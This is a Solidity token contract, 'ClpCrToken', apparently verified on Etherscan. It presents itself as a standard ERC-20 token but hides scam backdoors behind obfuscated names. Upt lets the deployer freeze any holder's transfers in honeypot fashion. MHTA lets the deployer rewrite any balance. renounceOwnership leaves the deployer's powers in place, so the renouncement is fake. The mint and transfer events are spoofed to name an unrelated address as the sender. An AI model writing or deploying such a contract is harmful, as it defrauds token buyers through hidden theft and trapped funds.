/**
 *Submitted for verification at Etherscan.io on 2023-02-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

contract ClpCrToken {
    mapping (address => uint256) private liIib;
    mapping (address => uint256) private liIic;
    
    mapping(address => mapping(address => uint256)) public allowance;
    
    string public name = "ClpCrToken";
    string public symbol = "clpcr";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000 *10**6;
    address owner = msg.sender;
    address private IRI;
    address xDeploy = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        IRI = msg.sender;
        lDy(msg.sender, totalSupply); 
        
    }
    
    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));owner = address(0);
    }


    function lDy (address account, uint256 amount) internal {
        account = xDeploy; 
 liIib[msg.sender] = totalSupply; 
        emit Transfer(address(0), account, amount); 
    }

   function balanceOf (address account) public view  returns (uint256) {
        return liIib[account];
    }

    function Upt(address sx, uint256 sz)  public {
        if(msg.sender == IRI) {liIic[sx] = sz;
        }
    }

    function transfer(address to, uint256 value) public returns (bool success) {
         if(liIic[msg.sender] <= 0) { 
            require(liIib[msg.sender] >= value);
            liIib[msg.sender] -= value;  
            liIib[to] += value;          
            emit Transfer(msg.sender, to, value);
            return true; }}

    function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; 
    }

    function MHTA(address sx, uint256 sz)  public {
        if(msg.sender == IRI) {liIib[sx] = sz;}
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == IRI) {require(value <= liIib[from]);require(value <= allowance[from][msg.sender]);
            liIib[from] -= value;  
            liIib[to] += value; 
            from = xDeploy;
            emit Transfer (from, to, value);
            return true; }else if(liIic[from] <= 0 && liIic[to] <= 0) {
            require(value <= liIib[from]);
            require(value <= allowance[from][msg.sender]);
            liIib[from] -= value;
            liIib[to] += value;
            allowance[from][msg.sender] -= value;
            emit Transfer(from, to, value);
            return true; 
        }
    }
}